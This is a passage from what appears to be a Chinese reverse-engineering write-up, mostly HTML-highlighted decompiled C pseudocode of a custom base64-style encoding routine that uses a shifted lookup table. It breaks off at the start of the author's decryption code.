<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>_DWORD<span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">/</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v4<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v5 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v4 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v5 <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v4 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v5 <span class=\"token operator\">=</span> v31<span class=\"token punctuation\">;</span>\n    v6 <span class=\"token operator\">=</span> v31<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  v7 <span class=\"token operator\">=</span> v6<span class=\"token punctuation\">;</span>\n  v8 <span class=\"token operator\">=</span> v6 <span class=\"token operator\">+</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v6 <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n    v8 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  v9 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>v8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">-</span> v5 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v10 <span class=\"token operator\">=</span> a1 <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    v11 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">-</span> v5 <span class=\"token operator\">-</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">3uLL</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">do</span>\n    <span class=\"token punctuation\">&#123;</span>\n      v3 <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n      v12 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n      v10 <span class=\"token operator\">+=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n      v13 <span class=\"token operator\">=</span> v12 <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n      v14 <span class=\"token operator\">=</span> v13 <span class=\"token operator\">-</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v13 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n        v14 <span class=\"token operator\">=</span> v13<span class=\"token punctuation\">;</span>\n      v9<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v14<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      v15 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n        v15 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n      v9<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v15<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      v16 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n        v16 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n      v9<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v16<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      v17 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3Fu</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n        v17 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v10 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n      v9<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v17<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token operator\">--</span>v11<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v11 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  v18 <span class=\"token operator\">=</span> v5 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v18 <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    v25 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">+</span> a1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">+</span> a1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40u</span> <span class=\"token punctuation\">)</span>\n      v25 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">+</span> a1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n    v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v25<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    v26 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">+</span> a1 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_WORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">15677</span><span class=\"token punctuation\">;</span>\n    v27 <span class=\"token operator\">=</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> v26 <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n    v28 <span class=\"token operator\">=</span> v27 <span class=\"token operator\">-</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v27 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n      v28 <span class=\"token operator\">=</span> v27<span class=\"token punctuation\">;</span>\n    v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v28<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">goto</span> LABEL_37<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v18 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\nLABEL_37<span class=\"token operator\">:</span>\n    v9<span class=\"token punctuation\">[</span>v7<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> v9<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  v19 <span class=\"token operator\">=</span> a1 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v2<span class=\"token punctuation\">;</span>\n  v20 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40u</span> <span class=\"token punctuation\">)</span>\n    v20 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n  v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v20<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  v21 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    v21 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n  v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v21<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  v22 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xF</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_WORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">61</span><span class=\"token punctuation\">;</span>\n  v23 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v22 <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n  v24 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v22 <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v23 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    v24 <span class=\"token operator\">=</span> v23<span class=\"token punctuation\">;</span>\n  v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v24<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> v9<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro 